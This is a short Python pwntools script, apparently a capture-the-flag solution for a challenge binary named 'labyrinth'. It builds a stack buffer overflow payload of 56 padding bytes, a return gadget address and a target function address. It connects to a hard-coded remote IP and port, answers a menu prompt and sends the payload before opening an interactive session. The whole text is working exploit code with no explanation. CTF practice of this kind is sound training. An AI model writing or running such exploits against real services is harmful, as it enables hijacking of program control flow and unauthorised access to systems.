from pwn import *

jnk = b'A'*56
ret = b'\x24\x13\x40\x00\x00\x00\x00\x00'
func_addr = b'\x55\x12\x40\x00\x00\x00\x00\x00'

pl = jnk + ret + func_addr

#f = './labyrinth'
#p = process(f)
p = remote('165.232.108.240', 31247)

print(p.recvuntil('>> '))
p.sendline(bytes('069', 'ascii'))
print(p.recvuntil('>> '))
p.sendline(pl)
p.interactive()
p.close()
